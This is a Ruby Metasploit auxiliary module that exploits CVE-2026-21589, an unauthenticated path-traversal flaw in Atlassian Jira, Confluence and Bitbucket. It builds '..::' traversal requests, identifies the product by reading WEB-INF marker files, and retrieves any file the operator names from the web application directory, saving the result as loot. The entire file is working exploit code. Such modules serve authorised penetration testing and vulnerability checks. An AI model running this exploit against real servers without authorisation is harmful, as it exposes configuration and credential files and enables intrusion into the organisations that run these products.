##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  PRODUCTS = {
    'JIRA' => {
      resource_path: 'download/resources/jira.webresources:color-picker-popup/images',
      depth: 5,
      marker_file: 'WEB-INF/web.xml',
      signature: 'com.atlassian.jira.web.ServletContextProviderListener'
    },
    'CONFLUENCE' => {
      resource_path: 's/1/_/download/resources/com.atlassian.confluence.plugins.dashboard-actions/images',
      depth: 8,
      marker_file: 'WEB-INF/web.xml',
      signature: 'com.atlassian.confluence.impl.webapp.ServletsInitializer'
    },
    'BITBUCKET' => {
      resource_path: 's/1.0/_/download/resources/com.atlassian.bitbucket.server.bitbucket-webpack-INTERNAL:avatar/avatar',
      depth: 5,
      marker_file: 'WEB-INF/urlrewrite.xml',
      signature: 'com.atlassian.plugin.servlet.ResourceDownloadUtils'
    }
  }.freeze

  def initialize
    super(
      'Name' => 'Atlassian CVE-2026-21589 Arbitrary File Read',
      'Description' => %q{
        This module exploits an unauthenticated path traversal vulnerability in
        Atlassian web-resource downloads to read files within the web application
        directory. Detection and request paths are currently implemented for
        Jira, Confluence, and Bitbucket Data Center.
        Detection paths are based on the public watchTowr Labs proof of concept.
      },
      'License' => MSF_LICENSE,
      'Author' => [
        '4n33sh'
      ],
      'References' => [
        ['CVE', '2026-21589'],
        ['URL', 'https://confluence.atlassian.com/security/cve-2026-21589-arbitrary-file-access-vulnerability-impacts-multiple-products-1870495748.html'],
        ['URL', 'https://github.com/watchtowrlabs/watchTowr-vs-Atlassian-CVE-2026-21589']
      ],
      'Notes' => {
        'Stability' => UNKNOWN_STABILITY,
        'SideEffects' => UNKNOWN_SIDE_EFFECTS,
        'Reliability' => UNKNOWN_RELIABILITY
      }
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to the Atlassian application', '/']),
        OptEnum.new('PRODUCT', [true, 'Atlassian product to target', 'Auto', ['Auto', 'Jira', 'Confluence', 'Bitbucket']]),
        OptString.new('FILEPATH', [false, 'File path relative to the application web root; defaults to the detection marker', ''])
      ]
    )
  end

  def check_host(_ip)
    detected_product, = detect_product

    return Exploit::CheckCode::Unknown('No supported Atlassian product could be confirmed through file traversal.') unless detected_product

    Exploit::CheckCode::Vulnerable(
      "Atlassian #{detected_product} is vulnerable to CVE-2026-21589: " \
      'successfully retrieved the product-specific marker file through path traversal.'
    )
  end

  def run_host(ip)
    detected_product, marker_response = detect_product

    unless detected_product
      print_status("#{ip}:#{rport} - No matching Atlassian product signature detected")
      return
    end

    print_good("#{ip}:#{rport} - Detected potentially vulnerable Atlassian #{detected_product}")

    product = PRODUCTS.fetch(detected_product)
    requested_file = datastore['FILEPATH'].to_s

    if requested_file.empty?
      requested_file = product[:marker_file]
      response = marker_response
    else
      response = request_file(product, requested_file)
    end

    unless response && response.code == 200
      print_error("#{ip}:#{rport} - Failed to retrieve '#{requested_file}'")
      return
    end

    if response.body.to_s.empty?
      print_error("#{ip}:#{rport} - The response for '#{requested_file}' was empty")
      return
    end

    loot_path = store_loot(
      'atlassian.cve_2026_21589.file',
      'application/octet-stream',
      ip,
      response.body,
      File.basename(requested_file),
      "Atlassian #{detected_product} file: #{requested_file}"
    )

    if datastore['FILEPATH'].to_s.empty?
      print_good("#{ip}:#{rport} - Retrieved the verified #{detected_product} marker file '#{requested_file}' and saved it to #{loot_path}")
    else
      print_status(
        "#{ip}:#{rport} - Saved a non-empty HTTP 200 response for '#{requested_file}' to #{loot_path}; " \
        'response content was not independently verified'
      )
    end
  end

  private

  def detect_product
    selected_products.each do |product_name|
      product = PRODUCTS.fetch(product_name)
      vprint_status("Checking for #{product_name}")

      response = request_file(product, product[:marker_file])
      next unless response&.code == 200
      next unless response.body&.include?(product[:signature])

      return [product_name, response]
    end

    [nil, nil]
  end

  def selected_products
    selected = datastore['PRODUCT'].to_s.upcase

    return PRODUCTS.keys if selected == 'AUTO'

    [selected]
  end

  def request_file(product, filepath)
    normalized_filepath = normalize_filepath(filepath)
    return nil unless normalized_filepath

    traversal = ('..::' * product[:depth]) + normalized_filepath.split('/').join('::')
    uri = normalize_uri(target_uri.path, product[:resource_path]) + "/#{traversal}"

    send_request_cgi!(
      {
        'method' => 'GET',
        'uri' => uri,
        'encode_params' => false
      }
    )
  end

  def normalize_filepath(filepath)
    path = filepath.to_s.tr('\\', '/').sub(%r{\A/+}, '')
    segments = path.split('/')

    invalid_path = path.empty? || path.end_with?('/') ||
                   path.match?(/[[:cntrl:]%?#]/) ||
                   segments.any? do |segment|
                     segment.empty? || segment == '.' || segment == '..' || segment.include?(':')
                   end

    if invalid_path
      print_error('FILEPATH must be a relative path without empty, dot, traversal, encoded, or URI-special segments')
      return nil
    end

    path
  end
end
